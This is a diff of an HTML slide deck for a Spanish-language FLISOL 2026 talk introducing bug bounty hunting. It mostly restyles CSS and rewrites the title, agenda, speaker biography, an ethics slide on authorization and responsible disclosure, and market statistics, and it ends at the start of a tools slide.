@@ -3,11 +3,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bug Bounty | FLISOL 2026</title>
-    <meta name="description" content="Introducción al Bug Bounty - Seguridad Ofensiva">
+    <title>El Viaje del Bug Hunter | FLISOL 2026</title>
+    <meta name="description" content="Bug Bounty: De la teoría a la práctica en 45 minutos">
     <meta name="author" content="Diego Medardo Saavedra García - Statick">
     
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🦹‍♂️</text></svg>">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🗺️</text></svg>">
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -20,7 +20,7 @@
     
     <style>
         :root {
-            --bg: #1a1b26;
+            --bg: #0f1117;
             --bg-card: rgba(255,255,255,0.02);
             --text: #c0caf5;
             --text-muted: #565f89;
@@ -29,17 +29,17 @@
             --pink: #f7768e;
             --orange: #ff9e64;
             --silver: #c0c0c0;
-            --sapphire: #0f52ba;
-            --doom-gold: #ffd700;
-            --border: rgba(255,255,255,0.05);
+            --gold: #f9e2af;
+            --purple: #bb9af7;
+            --border: rgba(255,255,255,0.06);
             --font: 'Inter', sans-serif;
             --mono: 'Fira Code', monospace;
         }
 
-        .reveal { font-family: var(--font); font-size: 24px; }
+        .reveal { font-family: var(--font); font-size: 22px; }
 
         .reveal .slides section {
-            padding: 15px 30px;
+            padding: 20px 40px;
             box-sizing: border-box;
             max-height: 100vh;
             overflow: hidden;
@@ -48,80 +48,101 @@
             justify-content: center;
         }
 
-        .reveal h1 { font-size: 2.5em; font-weight: 700; margin: 0 0 0.2em; color: var(--text); }
-        .reveal h2 { font-size: 1.1em; font-weight: 600; color: var(--doom-gold); margin: 0 0 0.3em; border-bottom: 2px solid var(--doom-gold); padding-bottom: 0.1em; display: inline-block; }
-        .reveal h3 { font-size: 0.85em; font-weight: 600; color: var(--cyan); margin: 0 0 0.25em; }
-        .reveal p { font-size: 0.72em; line-height: 1.4; color: var(--text-muted); margin: 0.15em 0; }
+        .reveal h1 { font-size: 2.2em; font-weight: 700; margin: 0 0 0.2em; color: var(--text); }
+        .reveal h2 { font-size: 1em; font-weight: 600; color: var(--gold); margin: 0 0 0.3em; display: inline-block; }
+        .reveal h3 { font-size: 0.75em; font-weight: 600; color: var(--cyan); margin: 0 0 0.2em; }
+        .reveal p { font-size: 0.68em; line-height: 1.4; color: var(--text-muted); margin: 0.12em 0; }
         .reveal a { color: var(--cyan); text-decoration: none; }
         .reveal a:hover { color: var(--green); }
-        .reveal code { font-family: var(--mono); font-size: 0.72em; background: rgba(255,158,100,0.1); padding: 2px 5px; border-radius: 3px; color: var(--orange); }
-        .reveal pre { margin: 0.3em 0; font-size: 0.62em; }
-        .reveal pre code { background: #0d0d14; padding: 0.5em; display: block; }
-        .reveal ul, .reveal ol { margin: 0; padding-left: 1em; font-size: 0.72em; text-align: left; }
-        .reveal li { margin: 0.15em 0; color: var(--text-muted); line-height: 1.3; }
-        .reveal li::marker { color: var(--doom-gold); }
+        .reveal code { font-family: var(--mono); font-size: 0.7em; background: rgba(255,158,100,0.12); padding: 2px 6px; border-radius: 4px; color: var(--orange); }
+        .reveal pre { margin: 0.25em 0; font-size: 0.58em; }
+        .reveal pre code { background: #0d0d14; padding: 0.6em; display: block; border-radius: 6px; }
+        .reveal ul, .reveal ol { margin: 0; padding-left: 1.2em; font-size: 0.68em; text-align: left; }
+        .reveal li { margin: 0.12em 0; color: var(--text-muted); line-height: 1.3; }
+        .reveal li::marker { color: var(--gold); }
 
-        .badge { display: inline-block; padding: 2px 8px; border-radius: 100px; font-size: 0.58em; font-weight: 500; margin: 2px; }
-        .badge.green { background: rgba(158,206,106,0.15); color: var(--green); }
-        .badge.pink { background: rgba(247,118,142,0.15); color: var(--pink); }
-        .badge.cyan { background: rgba(125,207,255,0.15); color: var(--cyan); }
-        .badge.orange { background: rgba(255,158,100,0.15); color: var(--orange); }
-        .badge.gold { background: rgba(255,215,0,0.15); color: var(--doom-gold); }
+        /* Badges */
+        .badge { display: inline-block; padding: 3px 10px; border-radius: 100px; font-size: 0.55em; font-weight: 500; margin: 2px; }
+        .badge.gold { background: rgba(249,226,175,0.12); color: var(--gold); border: 1px solid rgba(249,226,175,0.2); }
+        .badge.cyan { background: rgba(125,207,255,0.12); color: var(--cyan); border: 1px solid rgba(125,207,255,0.2); }
+        .badge.green { background: rgba(158,206,106,0.12); color: var(--green); border: 1px solid rgba(158,206,106,0.2); }
+        .badge.pink { background: rgba(247,118,142,0.12); color: var(--pink); border: 1px solid rgba(247,118,142,0.2); }
+        .badge.purple { background: rgba(187,154,247,0.12); color: var(--purple); border: 1px solid rgba(187,154,247,0.2); }
 
-        .card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 0.5em; text-align: left; }
-        .card h4 { font-size: 0.68em; margin: 0 0 0.1em; color: var(--text); }
-        .card p { font-size: 0.62em; margin: 0; }
-        .card-grid { display: grid; gap: 10px; margin-top: 0.4em; }
+        /* Cards */
+        .card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 10px; padding: 0.6em; text-align: left; transition: transform 0.2s; }
+        .card:hover { transform: translateY(-2px); border-color: rgba(255,255,255,0.1); }
+        .card h4 { font-size: 0.65em; margin: 0 0 0.15em; color: var(--text); }
+        .card p { font-size: 0.58em; margin: 0.05em 0; }
+        .card-grid { display: grid; gap: 12px; margin-top: 0.4em; }
         .card-grid.two { grid-template-columns: repeat(2, 1fr); }
         .card-grid.three { grid-template-columns: repeat(3, 1fr); }
         .card-grid.four { grid-template-columns: repeat(4, 1fr); }
 
-        .info-box { background: rgba(255,215,0,0.03); border: 1px solid rgba(255,215,0,0.15); border-radius: 8px; padding: 0.4em; }
-        .info-box.cyan { background: rgba(125,207,255,0.05); border-color: rgba(125,207,255,0.15); }
-        .info-box.pink { background: rgba(247,118,142,0.05); border-color: rgba(247,118,142,0.15); }
-        .info-box.orange { background: rgba(255,158,100,0.05); border-color: rgba(255,158,100,0.15); }
-        .info-box.green { background: rgba(158,206,106,0.05); border-color: rgba(158,206,106,0.15); }
-        .info-box h4 { font-size: 0.65em; margin: 0 0 0.15em; color: var(--doom-gold); }
+        /* Info boxes */
+        .info-box { background: rgba(249,226,175,0.03); border: 1px solid rgba(249,226,175,0.12); border-radius: 10px; padding: 0.5em; }
+        .info-box.cyan { background: rgba(125,207,255,0.04); border-color: rgba(125,207,255,0.12); }
+        .info-box.green { background: rgba(158,206,106,0.04); border-color: rgba(158,206,106,0.12); }
+        .info-box.pink { background: rgba(247,118,142,0.04); border-color: rgba(247,118,142,0.12); }
+        .info-box.orange { background: rgba(255,158,100,0.04); border-color: rgba(255,158,100,0.12); }
+        .info-box.purple { background: rgba(187,154,247,0.04); border-color: rgba(187,154,247,0.12); }
+        .info-box h4 { font-size: 0.62em; margin: 0 0 0.15em; color: var(--gold); }
         .info-box.cyan h4 { color: var(--cyan); }
+        .info-box.green h4 { color: var(--green); }
         .info-box.pink h4 { color: var(--pink); }
         .info-box.orange h4 { color: var(--orange); }
-        .info-box.green h4 { color: var(--green); }
+        .info-box.purple h4 { color: var(--purple); }
         .info-box ul { margin: 0; padding-left: 1em; }
-        .info-box li { font-size: 0.65em; margin: 0.08em 0; }
+        .info-box li { font-size: 0.6em; margin: 0.06em 0; }
 
-        .columns { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; text-align: left; }
+        /* Columns */
+        .columns { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; text-align: left; }
 
-        .terminal { background: #0d0d14; border: 1px solid var(--border); border-radius: 8px; padding: 0.5em; font-family: var(--mono); font-size: 0.58em; }
-        .terminal .line { margin: 0.06em 0; }
-        .terminal .prompt { color: var(--doom-gold); }
+        /* Terminal */
+        .terminal { background: #0d0d14; border: 1px solid var(--border); border-radius: 10px; padding: 0.6em; font-family: var(--mono); font-size: 0.55em; }
+        .terminal .line { margin: 0.05em 0; }
+        .terminal .prompt { color: var(--gold); }
         .terminal .command { color: var(--green); }
-        .terminal .comment { color: var(--text-muted); }
+        .terminal .comment { color: var(--text-muted); font-style: italic; }
         .terminal .output { color: var(--text-muted); padding-left: 1em; }
+        .terminal .highlight { color: var(--cyan); }
 
-        .title-slide h1 { font-size: 2.6em; color: var(--doom-gold); text-shadow: 0 0 30px rgba(255,215,0,0.3); }
-        .title-slide .subtitle { font-size: 1.05em; color: var(--text); margin: 0.08em 0 0.25em; }
-        .title-slide .author { margin-top: 0.6em; color: var(--text-muted); }
-        .thanks-slide h1 { font-size: 2.3em; color: var(--doom-gold); text-shadow: 0 0 30px rgba(255,215,0,0.3); }
-        .qa-slide h2 { font-size: 1.9em; color: var(--doom-gold); }
-
-        .stats-row { display: flex; justify-content: center; gap: 30px; margin: 0.4em 0; }
+        /* Stats */
+        .stats-row { display: flex; justify-content: center; gap: 35px; margin: 0.5em 0; }
         .stat { text-align: center; }
-        .stat .number { font-size: 1.5em; font-weight: 700; color: var(--doom-gold); }
-        .stat .label { font-size: 0.55em; color: var(--text-muted); }
+        .stat .number { font-size: 1.6em; font-weight: 700; color: var(--gold); }
+        .stat .label { font-size: 0.52em; color: var(--text-muted); }
 
-        .comparison-table { width: 100%; font-size: 0.58em; border-collapse: collapse; margin-top: 0.3em; }
-        .comparison-table th { background: rgba(255,215,0,0.1); color: var(--doom-gold); padding: 0.3em; text-align: left; }
-        .comparison-table td { padding: 0.25em 0.4em; border-bottom: 1px solid var(--border); color: var(--text-muted); }
+        /* Tables */
+        .comparison-table { width: 100%; font-size: 0.55em; border-collapse: collapse; margin-top: 0.3em; }
+        .comparison-table th { background: rgba(249,226,175,0.08); color: var(--gold); padding: 0.35em; text-align: left; border-bottom: 2px solid rgba(249,226,175,0.2); }
+        .comparison-table td { padding: 0.3em 0.4em; border-bottom: 1px solid var(--border); color: var(--text-muted); }
         .comparison-table tr:hover { background: rgba(255,255,255,0.02); }
 
-        .bib-item { font-size: 0.58em; margin: 0.3em 0; padding-left: 1em; text-indent: -1em; }
-        .bib-item .type { color: var(--cyan); font-weight: 600; }
+        /* Journey map */
+        .journey-step { display: flex; align-items: center; gap: 12px; margin: 0.3em 0; }
+        .journey-icon { font-size: 1.4em; }
+        .journey-content { text-align: left; }
+        .journey-content h4 { font-size: 0.62em; margin: 0; color: var(--text); }
+        .journey-content p { font-size: 0.55em; margin: 0; color: var(--text-muted); }
+        .journey-arrow { color: var(--gold); font-size: 0.8em; margin: 0 0.3em; }
 
-        .qr-box { background: white; padding: 8px; border-radius: 8px; display: inline-block; }
-        .qr-box img { display: block; width: 80px; height: 80px; }
+        /* Phase indicator */
+        .phase-indicator { display: inline-flex; align-items: center; gap: 8px; background: rgba(125,207,255,0.1); padding: 4px 12px; border-radius: 20px; margin-bottom: 0.3em; }
+        .phase-indicator .num { font-size: 0.7em; color: var(--cyan); font-weight: 700; }
+        .phase-indicator .text { font-size: 0.58em; color: var(--cyan); }
 
+        /* QR */
+        .qr-box { background: white; padding: 10px; border-radius: 10px; display: inline-block; }
+        .qr-box img { display: block; width: 90px; height: 90px; }
+
+        /* Bibliography */
+        .bib-item { font-size: 0.55em; margin: 0.25em 0; padding-left: 1.2em; text-indent: -1.2em; }
+        .bib-item .ref { color: var(--cyan); font-weight: 600; }
+
+        /* Responsive */
         @media (max-width: 768px) {
-            .reveal { font-size: 18px; }
+            .reveal { font-size: 16px; }
             .columns { grid-template-columns: 1fr; }
             .card-grid.two, .card-grid.three, .card-grid.four { grid-template-columns: 1fr; }
             .stats-row { flex-wrap: wrap; gap: 15px; }
@@ -132,126 +153,602 @@
     <div class="reveal">
         <div class="slides">
 
-            <!-- SLIDE 1: TITLE -->
-            <section class="title-slide">
-                <div style="display:flex;align-items:center;justify-content:center;gap:35px">
-                    <div style="text-align:right">
-                        <h1>Bug Bounty</h1>
-                        <p class="subtitle">El Arte de Conquistar Sistemas</p>
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 1: PORTADA — "El Viaje del Bug Hunter"                        -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section style="background: linear-gradient(135deg, rgba(15,17,23,1) 0%, rgba(30,32,48,1) 100%);">
+                <div style="text-align:center">
+                    <p style="font-size:0.65em;color:var(--cyan);letter-spacing:0.15em;margin-bottom:0.2em">FLISOL 2026 • LOJA</p>
+                    <h1 style="color:var(--gold);font-size:2.4em;text-shadow:0 0 40px rgba(249,226,175,0.2)">🗺️ El Viaje del Bug Hunter</h1>
+                    <p style="font-size:0.85em;color:var(--text);margin:0.15em 0 0.3em">De la teoría a la práctica en 45 minutos</p>
+                    
+                    <div style="display:flex;justify-content:center;gap:8px;margin:0.3em 0">
+                        <span class="badge gold">Bug Bounty</span>
+                        <span class="badge cyan">Hands-On</span>
+                        <span class="badge green">SQLi Demo</span>
+                    </div>
+
+                    <div style="display:flex;align-items:center;justify-content:center;gap:25px;margin-top:0.6em;padding-top:0.5em;border-top:1px solid var(--border)">
+                        <div class="qr-box">
+                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=90x90&data=https://statick88.github.io/charla-dr-doom" alt="QR Code">
+                        </div>
+                        <div style="text-align:left">
+                            <p style="font-size:0.72em;color:var(--text);margin:0">Diego Medardo Saavedra García</p>
+                            <p style="font-size:0.62em;color:var(--cyan);margin:0.1em 0 0">@statick88</p>
+                            <p style="font-size:0.52em;color:var(--text-muted);margin:0.15em 0 0">Prof. ESPE, UIDE, Abacom | Máster UCM</p>
+                            <p style="font-size:0.5em;color:var(--text-muted);margin:0.1em 0 0">Escanea para ver esta presentación</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 2: AGENDA — Mapa del Viaje                                    -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>📋 Mapa del Viaje</h2>
+                <p style="font-size:0.62em;color:var(--text-muted);margin-bottom:0.4em">8 paradas en nuestra aventura de Bug Bounty</p>
+                
+                <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:12px;text-align:left">
+                    <div style="display:flex;align-items:flex-start;gap:10px">
+                        <span style="font-size:1.3em">🧭</span>
                         <div>
-                            <span class="badge gold">FLISOL 2026</span>
-                            <span class="badge">Seguridad Ofensiva</span>
-                            <span class="badge pink">Hands-On</span>
+                            <p style="font-size:0.62em;color:var(--cyan);margin:0;font-weight:600">PARADA 1: ¿Quién soy?</p>
+                            <p style="font-size:0.52em;margin:0">Mi historia y experiencia</p>
                         </div>
-                        <p class="author">
-                            <span>👑</span>
-                            Diego Medardo Saavedra García — <span style="color:var(--cyan)">Statick</span><br>
-                            <span style="font-size:0.68em;color:var(--text-muted)">Prof. ESPE, UIDE, Abacom | Máster UCM</span>
-                        </p>
                     </div>
-                    <div>
-                        <img src="images/dr-doom.png" alt="Statick" style="height:140px;border-radius:12px;border:2px solid rgba(255,215,0,0.3);">
+                    <div style="display:flex;align-items:flex-start;gap:10px">
+                        <span style="font-size:1.3em">🗺️</span>
+                        <div>
+                            <p style="font-size:0.62em;color:var(--green);margin:0;font-weight:600">PARADA 2: ¿Qué es Bug Bounty?</p>
+                            <p style="font-size:0.52em;margin:0">Definición, industria y estadísticas</p>
+                        </div>
                     </div>
-                </div>
-                <div style="display:flex;align-items:center;justify-content:center;gap:20px;margin-top:0.3em">
-                    <div class="qr-box">
-                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=80x80&data=https://statick88.github.io/charla-dr-doom" alt="QR Code">
+                    <div style="display:flex;align-items:flex-start;gap:10px">
+                        <span style="font-size:1.3em">🎒</span>
+                        <div>
+                            <p style="font-size:0.62em;color:var(--orange);margin:0;font-weight:600">PARADA 3: Herramientas del Viajero</p>
+                            <p style="font-size:0.52em;margin:0">Labs, frameworks y setup</p>
+                        </div>
                     </div>
-                    <p style="font-size:0.62em;color:var(--text-muted)">Escanea para acceder a la presentación<br><a href="https://statick88.github.io/charla-dr-doom" target="_blank">statick88.github.io/charla-dr-doom</a></p>
+                    <div style="display:flex;align-items:flex-start;gap:10px">
+                        <span style="font-size:1.3em">🛤️</span>
+                        <div>
+                            <p style="font-size:0.62em;color:var(--pink);margin:0;font-weight:600">PARADA 4: El Camino (Metodología)</p>
+                            <p style="font-size:0.52em;margin:0">4 fases: Recon → Enum → Explot → Report</p>
+                        </div>
+                    </div>
+                    <div style="display:flex;align-items:flex-start;gap:10px">
+                        <span style="font-size:1.3em">⚔️</span>
+                        <div>
+                            <p style="font-size:0.62em;color:var(--purple);margin:0;font-weight:600">PARADA 5: Demostración en Vivo</p>
+                            <p style="font-size:0.52em;margin:0">SQL Injection paso a paso (DVWA)</p>
+                        </div>
+                    </div>
+                    <div style="display:flex;align-items:flex-start;gap:10px">
+                        <span style="font-size:1.3em">💰</span>
+                        <div>
+                            <p style="font-size:0.62em;color:var(--gold);margin:0;font-weight:600">PARADA 6: El Botín</p>
+                            <p style="font-size:0.52em;margin:0">Pagos, plataformas y roadmap</p>
+                        </div>
+                    </div>
+                    <div style="display:flex;align-items:flex-start;gap:10px">
+                        <span style="font-size:1.3em">🛡️</span>
+                        <div>
+                            <p style="font-size:0.62em;color:var(--cyan);margin:0;font-weight:600">PARADA 7: Los Obstáculos</p>
+                            <p style="font-size:0.52em;margin:0">OWASP Top 10 y vulnerabilidades</p>
+                        </div>
+                    </div>
+                    <div style="display:flex;align-items:flex-start;gap:10px">
+                        <span style="font-size:1.3em">📚</span>
+                        <div>
+                            <p style="font-size:0.62em;color:var(--green);margin:0;font-weight:600">PARADA 8: Cofre del Sabio</p>
+                            <p style="font-size:0.52em;margin:0">Recursos, referencias y contactos</p>
+                        </div>
+                    </div>
                 </div>
             </section>
 
-            <!-- SLIDE 2: LA LEY DE ORO -->
-            <section style="background: linear-gradient(135deg, rgba(255,215,0,0.08) 0%, rgba(0,0,0,0.9) 100%);">
-                <div style="border: 3px solid var(--doom-gold); border-radius: 16px; padding: 1.2em; max-width: 700px;">
-                    <h2 style="color: var(--doom-gold); font-size: 1.3em; margin-bottom: 0.2em; text-align: center;">⚖️ LA LEY DE ORO</h2>
-                    <p style="text-align: center; font-size: 0.68em; color: var(--text-muted); margin-bottom: 0.4em; font-style: italic;">
-                        "Antes de que les cuente mis secretos, esta es la regla de oro."
-                    </p>
-                    <div style="border-top: 2px solid rgba(255,215,0,0.3); padding-top: 0.5em;">
-                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left;">
-                            <div style="background: rgba(255,215,0,0.05); padding: 0.5em; border-radius: 8px; border: 1px solid rgba(255,215,0,0.2);">
-                                <p style="font-size: 0.65em; color: var(--doom-gold); margin: 0;"><strong>I. AUTORIZACIÓN</strong></p>
-                                <p style="font-size: 0.55em; color: var(--text-muted); margin: 0.1em 0 0;">Sin permiso explícito, NO toques NADA.</p>
-                            </div>
-                            <div style="background: rgba(255,215,0,0.05); padding: 0.5em; border-radius: 8px; border: 1px solid rgba(255,215,0,0.2);">
-                                <p style="font-size: 0.65em; color: var(--doom-gold); margin: 0;"><strong>II. SCOPE</strong></p>
-                                <p style="font-size: 0.55em; color: var(--text-muted); margin: 0.1em 0 0;">Fuera de scope = fuera de la ley.</p>
-                            </div>
-                            <div style="background: rgba(255,215,0,0.05); padding: 0.5em; border-radius: 8px; border: 1px solid rgba(255,215,0,0.2);">
-                                <p style="font-size: 0.65em; color: var(--doom-gold); margin: 0;"><strong>III. NO DESTRUIR</strong></p>
-                                <p style="font-size: 0.55em; color: var(--text-muted); margin: 0.1em 0 0;">PoC, no destrucción. Nunca.</p>
-                            </div>
-                            <div style="background: rgba(255,215,0,0.05); padding: 0.5em; border-radius: 8px; border: 1px solid rgba(255,215,0,0.2);">
-                                <p style="font-size: 0.65em; color: var(--doom-gold); margin: 0;"><strong>IV. RESPONSABLE</strong></p>
-                                <p style="font-size: 0.55em; color: var(--text-muted); margin: 0.1em 0 0;">Reporta al dueño. 90 días.</p>
-                            </div>
-                        </div>
-                        <div style="margin-top: 0.4em; text-align: center; background: rgba(247,118,142,0.1); padding: 0.4em; border-radius: 8px;">
-                            <p style="font-size: 0.62em; color: var(--pink); font-weight: 600; margin: 0;">🔴 "Romper estas reglas no es hacking. Es CRIMEN." 🔴</p>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- SLIDE 3: ¿QUIÉN SOY? -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 3: ¿QUIÉN SOY? — Mi Historia                                 -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <h2>¿Quién soy?</h2>
-                <p style="font-size:0.68em;color:var(--text-muted)">Les cuento brevemente mi historia profesional.</p>
-                <div class="card-grid four">
-                    <div class="card"><h4>👑 Profesor</h4><p>ESPE, UIDE, Abacom</p><p style="color:var(--doom-gold);font-size:0.52em">6 universidades</p></div>
-                    <div class="card"><h4>⚔️ Developer</h4><p>10+ años</p><p style="color:var(--sapphire);font-size:0.52em">FullStack</p></div>
-                    <div class="card"><h4>🦹‍♂️ Hacker</h4><p>Intigriti, Bugcrowd</p><p style="color:var(--green);font-size:0.52em">Ethical only</p></div>
-                    <div class="card"><h4>📚 Estudiante</h4><p>Máster UCM</p><p style="color:var(--cyan);font-size:0.52em">Ciberseguridad</p></div>
+                <div class="phase-indicator">
+                    <span class="num">PARADA 1</span>
+                    <span class="text">¿Quién soy?</span>
                 </div>
-                <div class="info-box" style="margin-top:0.4em">
-                    <h4>🏆 Logros</h4>
-                    <p style="font-size:0.62em"><strong>RootedCON 2026:</strong> 15/15 challenges | <strong>70+ challenges</strong> | <a href="https://github.com/statick88/challenges" target="_blank">GitHub</a></p>
+                <h2>🧭 Mi Historia</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Diego Medardo Saavedra García — @statick88</p>
+                
+                <div class="card-grid four" style="margin-top:0.4em">
+                    <div class="card" style="border-left:3px solid var(--cyan)">
+                        <h4 style="color:var(--cyan)">🎓 Profesor</h4>
+                        <p style="font-size:0.55em">ESPE, UIDE, Abacom</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">6 universidades</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">10+ años enseñando</p>
+                    </div>
+                    <div class="card" style="border-left:3px solid var(--green)">
+                        <h4 style="color:var(--green)">💻 Developer</h4>
+                        <p style="font-size:0.55em">FullStack Engineer</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">Java, Python, JS</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">300+ repos GitHub</p>
+                    </div>
+                    <div class="card" style="border-left:3px solid var(--pink)">
+                        <h4 style="color:var(--pink)">🔍 Hacker Ético</h4>
+                        <p style="font-size:0.55em">Intigriti, Bugcrowd</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">Bug Bounty Hunter</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">70+ CTF challenges</p>
+                    </div>
+                    <div class="card" style="border-left:3px solid var(--gold)">
+                        <h4 style="color:var(--gold)">📚 Estudiante</h4>
+                        <p style="font-size:0.55em">Máster UCM</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">Ciberseguridad</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">Investigación activa</p>
+                    </div>
+                </div>
+
+                <div class="info-box purple" style="margin-top:0.4em">
+                    <h4 style="color:var(--purple)">🏆 Logros Recientes</h4>
+                    <p style="font-size:0.6em"><strong>RootedCON 2026:</strong> 15/15 challenges | <strong>292 PRs merged</strong> | <strong>83 repos</strong> públicos</p>
+                    <p style="font-size:0.55em">Autor de 300+ artículos técnicos y 8 eBooks de hacking</p>
                 </div>
             </section>
 
-            <!-- SLIDE 4: ¿QUÉ ES BUG BOUNTY? -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 4: LA REGLA DEL CAMINO — Ética                               -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section style="background: linear-gradient(135deg, rgba(247,118,142,0.05) 0%, rgba(15,17,23,1) 100%);">
+                <h2>⚖️ La Regla del Camino</h2>
+                <p style="font-size:0.62em;color:var(--text-muted);margin-bottom:0.4em">Antes de emprender el viaje, estas son las reglas que debes seguir.</p>
+                
+                <div style="border:2px solid var(--pink);border-radius:12px;padding:0.8em;max-width:650px;margin:0 auto">
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
+                        <div style="background:rgba(247,118,142,0.06);padding:0.5em;border-radius:8px;text-align:left">
+                            <p style="font-size:0.65em;color:var(--pink);margin:0;font-weight:600">1️⃣ AUTORIZACIÓN</p>
+                            <p style="font-size:0.52em;margin:0.1em 0 0">Sin permiso explícito, NO toques NADA.</p>
+                        </div>
+                        <div style="background:rgba(247,118,142,0.06);padding:0.5em;border-radius:8px;text-align:left">
+                            <p style="font-size:0.65em;color:var(--pink);margin:0;font-weight:600">2️⃣ SCOPE</p>
+                            <p style="font-size:0.52em;margin:0.1em 0 0">Fuera de scope = fuera de la ley.</p>
+                        </div>
+                        <div style="background:rgba(247,118,142,0.06);padding:0.5em;border-radius:8px;text-align:left">
+                            <p style="font-size:0.65em;color:var(--pink);margin:0;font-weight:600">3️⃣ NO DESTRUIR</p>
+                            <p style="font-size:0.52em;margin:0.1em 0 0">Proof of Concept, nunca destrucción.</p>
+                        </div>
+                        <div style="background:rgba(247,118,142,0.06);padding:0.5em;border-radius:8px;text-align:left">
+                            <p style="font-size:0.65em;color:var(--pink);margin:0;font-weight:600">4️⃣ RESPONSABLE</p>
+                            <p style="font-size:0.52em;margin:0.1em 0 0">Reporta al dueño. Espera 90 días.</p>
+                        </div>
+                    </div>
+                    <div style="margin-top:0.5em;text-align:center;background:rgba(247,118,142,0.1);padding:0.4em;border-radius:8px">
+                        <p style="font-size:0.62em;color:var(--pink);font-weight:600;margin:0">⚠️ "Romper estas reglas no es hacking. Es CRIMEN." ⚠️</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 5: ¿QUÉ ES BUG BOUNTY? — Definición + Stats                  -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <h2>¿Qué es Bug Bounty?</h2>
-                <p style="font-size:0.68em;color:var(--text-muted)">Programa de recompensas para encontrar vulnerabilidades de forma legal. Ver referencias [2], [5].</p>
+                <div class="phase-indicator">
+                    <span class="num">PARADA 2</span>
+                    <span class="text">¿Qué es Bug Bounty?</span>
+                </div>
+                <h2>🗺️ El Destino del Viaje</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Programas que pagan por encontrar vulnerabilidades de forma legal.</p>
                 
                 <div class="stats-row">
                     <div class="stat">
+                        <div class="number">$1.76B</div>
+                        <div class="label">Mercado 2025 [5]</div>
+                    </div>
+                    <div class="stat">
                         <div class="number">$6.67B</div>
-                        <div class="label">Mercado 2034 (proy.) [5]</div>
+                        <div class="label">Proyección 2034 [5]</div>
                     </div>
                     <div class="stat">
-                        <div class="number">50%</div>
-                        <div class="label">Empresas Fortune 500 [2]</div>
+                        <div class="number">32K+</div>
+                        <div class="label">Hunters activos [2]</div>
                     </div>
                     <div class="stat">
-                        <div class="number">57%</div>
-                        <div class="label">Crecimiento hunters [2]</div>
-                    </div>
-                    <div class="stat">
-                        <div class="number">37%</div>
-                        <div class="label">Brechas por vulns [2]</div>
+                        <div class="number">$850</div>
+                        <div class="label">Pago promedio [2]</div>
                     </div>
                 </div>
 
-                <div class="columns" style="margin-top:0.3em">
-                    <div class="info-box"><h4>🏰 Para Empresas [2]</h4><ul><li>Descubrimiento proactivo de vulnerabilidades</li><li>80% encuentran bugs que otros métodos no detectan</li><li>Cumplimiento normativo: NIS2, GDPR, ISO 27001 [4]</li><li>ROI demostrado: 16% dicen beneficios superan costos</li></ul></div>
-                    <div class="info-box cyan"><h4>⚔️ Para Hackers [2]</h4><ul><li>Pago promedio: $850/reporte</li><li>Pago máximo: $65,000</li><li>92% motivados por dinero</li><li>Comunidad: 32,000+ investigadores globales</li></ul></div>
+                <div class="columns" style="margin-top:0.4em">
+                    <div class="info-box green">
+                        <h4>🏢 Para Empresas</h4>
+                        <ul style="font-size:0.58em">
+                            <li>Descubrimiento proactivo de vulnerabilidades</li>
+                            <li>80% encuentran bugs que otros métodos no detectan</li>
+                            <li>Cumplimiento normativo: NIS2, GDPR, ISO 27001</li>
+                            <li>ROI: 16% reportan beneficios > costos</li>
+                        </ul>
+                    </div>
+                    <div class="info-box cyan">
+                        <h4>👨‍💻 Para Hackers</h4>
+                        <ul style="font-size:0.58em">
+                            <li>Pagos: $100 (Low) hasta $65,000 (Critical)</li>
+                            <li>Flexibilidad: trabaja desde donde quieras</li>
+                            <li>Aprendizaje: tech stacks reales</li>
+                            <li>Comunidad: 233 programas activos [2]</li>
+                        </ul>
+                    </div>
                 </div>
             </section>
 
-            <!-- SLIDE 5: PLATAFORMAS -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 6: HERRAMIENTAS DEL VIAJERO — Labs                           -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <h2>Plataformas de Bug Bounty</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Comparativa de plataformas según cobertura y payout.</p>
+                <div class="phase-indicator">
+                    <span class="num">PARADA 3</span>
+                    <span class="text">Herramientas del Viajero</span>
+                </div>
+                <h2>🎒 Tu Kit de Supervivencia</h2>
